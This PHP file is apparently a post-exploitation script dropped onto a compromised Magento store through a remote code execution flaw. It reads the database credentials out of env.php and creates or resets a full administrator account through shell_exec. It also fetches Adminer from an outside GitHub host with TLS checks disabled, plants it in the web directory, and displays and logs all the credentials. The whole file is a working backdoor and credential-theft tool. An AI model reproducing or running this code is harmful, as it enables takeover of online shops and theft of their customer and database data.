<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('max_execution_time', 300);

// ============================================
// CONFIGURATION
// ============================================
$ADMIN_USERNAME = 'yourusername'; ## Change the username
$ADMIN_PASSWORD = 'yourpassword'; ## Change the password
$ADMIN_EMAIL = 'youremail@mail.com'; ## Change the email
$ADMIN_FIRSTNAME = 'New';
$ADMIN_LASTNAME = 'User';
$ADMINER_URL = 'https://raw.githubusercontent.com/khadafigans/Magento-Polyshell-RCE/refs/heads/main/adminer.php';

// ============================================
// HTML OUTPUT
// ============================================
function outputHtml($data, $env_data, $adminer_result, $shell_extension, $admin_url, $adminer_url, $base_url, $magento_root, $php_bin) {
    $bgGradient = 'linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%)';
    $cardBg = 'rgba(255,255,255,0.05)';
    $borderColor = 'rgba(255,255,255,0.1)';
    $successColor = '#00d9ff';
    $textColor = '#e0e0e0';
    
    echo '<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Magento Admin Creator - Success</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
            background: ' . $bgGradient . ';
            min-height: 100vh;
            padding: 20px;
            color: ' . $textColor . ';
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
        }
        .header {
            text-align: center;
            padding: 30px;
            background: rgba(0,0,0,0.3);
            border-radius: 15px;
            margin-bottom: 20px;
            border: 1px solid ' . $borderColor . ';
        }
        .header h1 {
            color: ' . $successColor . ';
            font-size: 2em;
            margin-bottom: 10px;
            text-shadow: 0 0 20px rgba(0,217,255,0.5);
        }
        .card {
            background: ' . $cardBg . ';
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 20px;
            border: 1px solid ' . $borderColor . ';
            backdrop-filter: blur(10px);
        }
        .card-title {
            color: ' . $successColor . ';
            font-size: 1.3em;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .info-row {
            display: flex;
            padding: 12px 0;
            border-bottom: 1px solid rgba(255,255,255,0.05);
        }
        .info-row:last-child { border-bottom: none; }
        .info-label {
            font-weight: 600;
            color: #888;
            min-width: 150px;
        }
        .info-value {
            color: #fff;
            font-family: monospace;
            word-break: break-all;
        }
        .info-value a {
            color: ' . $successColor . ';
            text-decoration: none;
        }
        .info-value a:hover { text-decoration: underline; }
        .status-success {
            background: rgba(0,255,136,0.1);
            border: 1px solid rgba(0,255,136,0.3);
            color: #00ff88;
            padding: 10px 15px;
            border-radius: 8px;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        .status-error {
            background: rgba(255,0,85,0.1);
            border: 1px solid rgba(255,0,85,0.3);
            color: #ff0055;
            padding: 10px 15px;
            border-radius: 8px;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        .command-box {
            background: rgba(0,0,0,0.4);
            border-radius: 8px;
            padding: 15px;
            font-family: "Courier New", monospace;
            font-size: 0.9em;
            color: #00ff88;
            overflow-x: auto;
            border-left: 3px solid #00ff88;
        }
        .footer {
            text-align: center;
            padding: 20px;
            color: #666;
            font-size: 0.9em;
        }
        .icon { font-size: 1.2em; }
        @media (max-width: 600px) {
            .info-row { flex-direction: column; }
            .info-label { margin-bottom: 5px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>✅ SUCCESS!</h1>
            <p>Admin user has been ' . $data['action'] . ' successfully</p>
        </div>
        
        <div class="card">
            <div class="card-title"><span class="icon">👤</span> Admin Credentials</div>
            <div class="info-row">
                <span class="info-label">Username:</span>
                <span class="info-value">' . htmlspecialchars($data['username']) . '</span>
            </div>
            <div class="info-row">
                <span class="info-label">Password:</span>
                <span class="info-value">' . htmlspecialchars($data['password']) . '</span>
            </div>
            <div class="info-row">
                <span class="info-label">Email:</span>
                <span class="info-value">' . htmlspecialchars($data['email']) . '</span>
            </div>
            <div class="info-row">
                <span class="info-label">Login URL:</span>
                <span class="info-value"><a href="' . htmlspecialchars($admin_url) . '" target="_blank">' . htmlspecialchars($admin_url) . '</a></span>
            </div>
        </div>
        
        <div class="card">
            <div class="card-title"><span class="icon">🗄️</span> Database Credentials</div>
            <div class="info-row">
                <span class="info-label">Adminer URL:</span>
                <span class="info-value">';
                if ($adminer_result['success']) {
                    echo '<a href="' . htmlspecialchars($adminer_url) . '" target="_blank">' . htmlspecialchars($adminer_url) . '</a>';
                } else {
                    echo '<span class="status-error">❌ Failed - ' . htmlspecialchars($adminer_result['error']) . '</span>';
                }
                echo '</span>
            </div>
            <div class="info-row">
                <span class="info-label">DB_HOST:</span>
                <span class="info-value">' . htmlspecialchars($env_data['db_host']) . '</span>
            </div>
            <div class="info-row">
                <span class="info-label">DB_USERNAME:</span>
                <span class="info-value">' . htmlspecialchars($env_data['db_user']) . '</span>
            </div>
            <div class="info-row">
                <span class="info-label">DB_PASSWORD:</span>
                <span class="info-value">' . htmlspecialchars($env_data['db_pass']) . '</span>
            </div>
            <div class="info-row">
                <span class="info-label">DB_NAME:</span>
                <span class="info-value">' . htmlspecialchars($env_data['db_name']) . '</span>
            </div>';
            if (!empty($env_data['table_prefix'])) {
                echo '<div class="info-row">
                    <span class="info-label">TABLE_PREFIX:</span>
                    <span class="info-value">' . htmlspecialchars($env_data['table_prefix']) . '</span>
                </div>';
            }
        echo '</div>
        
        <div class="card">
            <div class="card-title"><span class="icon">🔗</span> Quick Commands</div>
            <p style="margin-bottom: 10px; color: #888;">MySQL Connection:</p>
            <div class="command-box">mysql -h ' . htmlspecialchars($env_data['db_host']) . ' -u ' . htmlspecialchars($env_data['db_user']) . ' -p\'' . htmlspecialchars($env_data['db_pass']) . '\' ' . htmlspecialchars($env_data['db_name']) . '</div>
            <p style="margin: 15px 0 10px; color: #888;">Magento CLI:</p>
            <div class="command-box">cd ' . htmlspecialchars($magento_root) . ' && ' . htmlspecialchars($php_bin) . ' bin/magento admin:user:create --admin-user=' . htmlspecialchars($data['username']) . ' --admin-password=\'' . htmlspecialchars($data['password']) . '\' --admin-email=' . htmlspecialchars($data['email']) . ' --admin-firstname=' . htmlspecialchars($data['firstname']) . ' --admin-lastname=' . htmlspecialchars($data['lastname']) . '</div>
        </div>
        
        <div class="card">
            <div class="card-title"><span class="icon">ℹ️</span> System Info</div>
            <div class="info-row">
                <span class="info-label">Magento Root:</span>
                <span class="info-value">' . htmlspecialchars($magento_root) . '</span>
            </div>
            <div class="info-row">
                <span class="info-label">PHP Binary:</span>
                <span class="info-value">' . htmlspecialchars($php_bin) . '</span>
            </div>
            <div class="info-row">
                <span class="info-label">Shell Extension:</span>
                <span class="info-value">.' . htmlspecialchars($shell_extension) . '</span>
            </div>
            <div class="info-row">
                <span class="info-label">Base URL:</span>
                <span class="info-value">' . htmlspecialchars($base_url) . '</span>
            </div>
        </div>
        
        <div class="footer">
            <p>🤖 Admin Creator | ' . date('Y-m-d H:i:s') . '</p>
        </div>
    </div>
</body>
</html>';
}

// ============================================
// FIND MAGENTO ROOT
// ============================================
function findMagentoRoot() {
    $possible_roots = [
        '/var/www/html',
        '/var/www',
        '/home',
        dirname(__FILE__) . '/../../../../../../../',
        dirname(__FILE__) . '/../../../../../../../../',
        dirname(__FILE__) . '/../../../../../../',
        dirname(__FILE__) . '/../../../../../',
        dirname(__FILE__) . '/../../../../',
        dirname(__FILE__) . '/../../../',
        dirname(__FILE__) . '/../../',
        dirname(__FILE__) . '/../',
        dirname(__FILE__),
    ];
    
    foreach ($possible_roots as $root) {
        $root = realpath($root);
        if ($root && file_exists($root . '/app/bootstrap.php') && file_exists($root . '/app/etc/env.php')) {
            return $root;
        }
    }
    
    $current = dirname(__FILE__);
    for ($i = 0; $i < 10; $i++) {
        $parent = realpath($current . str_repeat('/..', $i));
        if ($parent && file_exists($parent . '/app/bootstrap.php') && file_exists($parent . '/app/etc/env.php')) {
            return $parent;
        }
    }
    
    return null;
}

// ============================================
// FIND PHP BINARY
// ============================================
function findPhpBinary() {
    $possible_paths = [
        '/usr/bin/php',
        '/usr/local/bin/php',
        '/usr/bin/php7.4',
        '/usr/bin/php7.3',
        '/usr/bin/php7.2',
        '/usr/bin/php7.1',
        '/usr/bin/php7.0',
        '/usr/bin/php8.0',
        '/usr/bin/php8.1',
        '/usr/bin/php8.2',
        '/opt/php/bin/php',
        '/opt/plesk/php/7.4/bin/php',
        '/opt/plesk/php/7.3/bin/php',
        '/opt/plesk/php/8.0/bin/php',
        'php',
    ];
    
    foreach ($possible_paths as $path) {
        if ($path === 'php' || file_exists($path)) {
            $test = @shell_exec($path . ' -v 2>&1');
            if ($test && strpos($test, 'PHP') !== false) {
                return $path;
            }
        }
    }
    
    return 'php';
}

// ============================================
// PARSE ENV.PHP
// ============================================
function parseEnvPhp($magento_root) {
    $env_file = $magento_root . '/app/etc/env.php';
    
    if (!file_exists($env_file)) {
        return null;
    }
    
    $env_content = file_get_contents($env_file);
    
    $data = [
        'db_host' => 'localhost',
        'db_name' => '',
        'db_user' => '',
        'db_pass' => '',
        'admin_path' => 'admin',
        'table_prefix' => ''
    ];
    
    if (preg_match('/["\']frontName["\']\s*=>\s*["\']([^"\']+)/', $env_content, $matches)) {
        $data['admin_path'] = $matches[1];
    }
    
    if (preg_match('/["\']host["\']\s*=>\s*["\']([^"\']+)/', $env_content, $matches)) {
        $data['db_host'] = $matches[1];
    }
    if (preg_match('/["\']dbname["\']\s*=>\s*["\']([^"\']+)/', $env_content, $matches)) {
        $data['db_name'] = $matches[1];
    }
    if (preg_match('/["\']username["\']\s*=>\s*["\']([^"\']+)/', $env_content, $matches)) {
        $data['db_user'] = $matches[1];
    }
    if (preg_match('/["\']password["\']\s*=>\s*["\']([^"\']+)/', $env_content, $matches)) {
        $data['db_pass'] = $matches[1];
    }
    if (preg_match('/["\']table_prefix["\']\s*=>\s*["\']([^"\']*)/', $env_content, $matches)) {
        $data['table_prefix'] = $matches[1];
    }
    
    return $data;
}

// ============================================
// CREATE ADMIN VIA MAGENTO CLI
// ============================================
function createAdminUser($magento_root, $php_bin) {
    global $ADMIN_USERNAME, $ADMIN_PASSWORD, $ADMIN_EMAIL, $ADMIN_FIRSTNAME, $ADMIN_LASTNAME;
    
    $bin_magento = $magento_root . '/bin/magento';
    
    if (!file_exists($bin_magento)) {
        return ['success' => false, 'error' => 'bin/magento not found'];
    }
    
    $check_cmd = sprintf(
        'cd %s && %s bin/magento admin:user:list 2>&1',
        escapeshellarg($magento_root),
        $php_bin
    );
    $check_output = shell_exec($check_cmd);
    
    $action = 'created';
    if ($check_output && strpos($check_output, $ADMIN_USERNAME) !== false) {
        $delete_cmd = sprintf(
            'cd %s && %s bin/magento admin:user:delete %s -y 2>&1',
            escapeshellarg($magento_root),
            $php_bin,
            escapeshellarg($ADMIN_USERNAME)
        );
        shell_exec($delete_cmd);
        $action = 'updated';
    }
    
    $create_cmd = sprintf(
        'cd %s && %s bin/magento admin:user:create --admin-user=%s --admin-password=%s --admin-email=%s --admin-firstname=%s --admin-lastname=%s 2>&1',
        escapeshellarg($magento_root),
        $php_bin,
        escapeshellarg($ADMIN_USERNAME),
        escapeshellarg($ADMIN_PASSWORD),
        escapeshellarg($ADMIN_EMAIL),
        escapeshellarg($ADMIN_FIRSTNAME),
        escapeshellarg($ADMIN_LASTNAME)
    );
    
    $output = shell_exec($create_cmd);
    
    if ($output && (strpos($output, 'successfully') !== false || strpos($output, 'Created') !== false || strpos($output, 'created') !== false)) {
        return [
            'success' => true, 
            'action' => $action,
            'username' => $ADMIN_USERNAME,
            'password' => $ADMIN_PASSWORD,
            'email' => $ADMIN_EMAIL,
            'firstname' => $ADMIN_FIRSTNAME,
            'lastname' => $ADMIN_LASTNAME
        ];
    }
    
    $alt_cmd = sprintf(
        'cd %s && %s -d memory_limit=2G bin/magento admin:user:create --admin-user=%s --admin-password=%s --admin-email=%s --admin-firstname=%s --admin-lastname=%s 2>&1',
        escapeshellarg($magento_root),
        $php_bin,
        escapeshellarg($ADMIN_USERNAME),
        escapeshellarg($ADMIN_PASSWORD),
        escapeshellarg($ADMIN_EMAIL),
        escapeshellarg($ADMIN_FIRSTNAME),
        escapeshellarg($ADMIN_LASTNAME)
    );
    
    $alt_output = shell_exec($alt_cmd);
    
    if ($alt_output && (strpos($alt_output, 'successfully') !== false || strpos($alt_output, 'Created') !== false)) {
        return [
            'success' => true, 
            'action' => $action,
            'username' => $ADMIN_USERNAME,
            'password' => $ADMIN_PASSWORD,
            'email' => $ADMIN_EMAIL,
            'firstname' => $ADMIN_FIRSTNAME,
            'lastname' => $ADMIN_LASTNAME
        ];
    }
    
    return [
        'success' => false, 
        'error' => 'CLI command failed',
        'output' => $output . "\n" . $alt_output
    ];
}

// ============================================
// FALLBACK: CREATE ADMIN VIA MAGENTO API
// ============================================
function createAdminViaMagento($magento_root) {
    global $ADMIN_USERNAME, $ADMIN_PASSWORD, $ADMIN_EMAIL, $ADMIN_FIRSTNAME, $ADMIN_LASTNAME;
    
    try {
        require $magento_root . '/app/bootstrap.php';
        $bootstrap = \Magento\Framework\App\Bootstrap::create(BP, $_SERVER);
        $objectManager = $bootstrap->getObjectManager();
        
        $state = $objectManager->get('Magento\Framework\App\State');
        $state->setAreaCode('adminhtml');
        
        $userFactory = $objectManager->get('Magento\User\Model\UserFactory');
        
        $existingUser = $userFactory->create()->loadByUsername($ADMIN_USERNAME);
        if ($existingUser && $existingUser->getId()) {
            $existingUser->setPassword($ADMIN_PASSWORD);
            $existingUser->setEmail($ADMIN_EMAIL);
            $existingUser->setIsActive(1);
            $existingUser->save();
            return [
                'success' => true, 
                'action' => 'updated',
                'username' => $ADMIN_USERNAME,
                'password' => $ADMIN_PASSWORD,
                'email' => $ADMIN_EMAIL,
                'firstname' => $ADMIN_FIRSTNAME,
                'lastname' => $ADMIN_LASTNAME
            ];
        }
        
        $user = $userFactory->create();
        $user->setData([
            'username'      => $ADMIN_USERNAME,
            'firstname'     => $ADMIN_FIRSTNAME,
            'lastname'      => $ADMIN_LASTNAME,
            'email'         => $ADMIN_EMAIL,
            'password'      => $ADMIN_PASSWORD,
            'is_active'     => 1,
        ]);
        $user->setRoleId(1);
        $user->save();
        
        return [
            'success' => true, 
            'action' => 'created',
            'username' => $ADMIN_USERNAME,
            'password' => $ADMIN_PASSWORD,
            'email' => $ADMIN_EMAIL,
            'firstname' => $ADMIN_FIRSTNAME,
            'lastname' => $ADMIN_LASTNAME
        ];
        
    } catch (Exception $e) {
        return ['success' => false, 'error' => $e->getMessage()];
    }
}

// ============================================
// DOWNLOAD ADMINER
// ============================================
function downloadAdminer($shell_dir, $extension) {
    global $ADMINER_URL;
    
    $adminer_filename = 'adminer.' . $extension;
    $adminer_path = $shell_dir . '/' . $adminer_filename;
    
    $content = false;
    
    if (function_exists('file_get_contents')) {
        $context = stream_context_create([
            'http' => [
                'timeout' => 60,
                'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            ],
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false
            ]
        ]);
        $content = @file_get_contents($ADMINER_URL, false, $context);
    }
    
    if ($content === false && function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $ADMINER_URL);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 60);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
        $content = curl_exec($ch);
        curl_close($ch);
    }
    
    if ($content === false && function_exists('system')) {
        $temp_file = sys_get_temp_dir() . '/adminer_temp_' . uniqid() . '.php';
        @system('wget -q -O ' . escapeshellarg($temp_file) . ' ' . escapeshellarg($ADMINER_URL) . ' 2>/dev/null');
        if (file_exists($temp_file) && filesize($temp_file) > 0) {
            $content = file_get_contents($temp_file);
            @unlink($temp_file);
        }
    }
    
    if ($content === false || strlen($content) < 1000) {
        return ['success' => false, 'error' => 'Failed to download Adminer'];
    }
    
    if (@file_put_contents($adminer_path, $content)) {
        return [
            'success' => true,
            'path' => $adminer_path,
            'filename' => $adminer_filename
        ];
    }
    
    return ['success' => false, 'error' => 'Failed to write Adminer file'];
}

// ============================================
// GET SITE BASE URL
// ============================================
function getSiteBaseUrl() {
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
    return $protocol . '://' . $host;
}

// ============================================
// MAIN EXECUTION
// ============================================

// Get shell info
$shell_path = __FILE__;
$shell_dir = dirname($shell_path);
$shell_filename = basename($shell_path);
$shell_extension = pathinfo($shell_filename, PATHINFO_EXTENSION);

// Find Magento
$magento_root = findMagentoRoot();
if (!$magento_root) {
    die('<h1 style="color:red">❌ Error: Could not find Magento root directory!</h1>');
}

// Parse env.php
$env_data = parseEnvPhp($magento_root);
if (!$env_data) {
    die('<h1 style="color:red">❌ Error: Could not parse env.php!</h1>');
}

// Find PHP binary
$php_bin = findPhpBinary();

// Create admin user
$admin_result = createAdminUser($magento_root, $php_bin);

if (!$admin_result['success']) {
    $admin_result = createAdminViaMagento($magento_root);
}

if (!$admin_result['success']) {
    die('<h1 style="color:red">❌ Error creating admin: ' . htmlspecialchars($admin_result['error']) . '</h1>');
}

// Download Adminer
$adminer_result = downloadAdminer($shell_dir, $shell_extension);

// Build URLs
$base_url = getSiteBaseUrl();
$shell_web_path = str_replace($_SERVER['DOCUMENT_ROOT'], '', $shell_dir);
$adminer_url = $base_url . $shell_web_path . '/' . ($adminer_result['success'] ? $adminer_result['filename'] : 'adminer.' . $shell_extension);
$admin_url = $base_url . '/' . $env_data['admin_path'];

// Output pretty HTML
outputHtml($admin_result, $env_data, $adminer_result, $shell_extension, $admin_url, $adminer_url, $base_url, $magento_root, $php_bin);

// Also save to file for persistence
$log_file = $shell_dir . '/admin_credentials_' . date('Ymd_His') . '.txt';
$log_content = "Admin Credentials Log - " . date('Y-m-d H:i:s') . "\n";
$log_content .= "================================================\n\n";
$log_content .= "Username: " . $admin_result['username'] . "\n";
$log_content .= "Password: " . $admin_result['password'] . "\n";
$log_content .= "Email: " . $admin_result['email'] . "\n";
$log_content .= "Admin URL: " . $admin_url . "\n";
$log_content .= "Adminer URL: " . $adminer_url . "\n\n";
$log_content .= "Database Credentials:\n";
$log_content .= "DB_HOST: " . $env_data['db_host'] . "\n";
$log_content .= "DB_USERNAME: " . $env_data['db_user'] . "\n";
$log_content .= "DB_PASSWORD: " . $env_data['db_pass'] . "\n";
$log_content .= "DB_NAME: " . $env_data['db_name'] . "\n";

@file_put_contents($log_file, $log_content);
?>
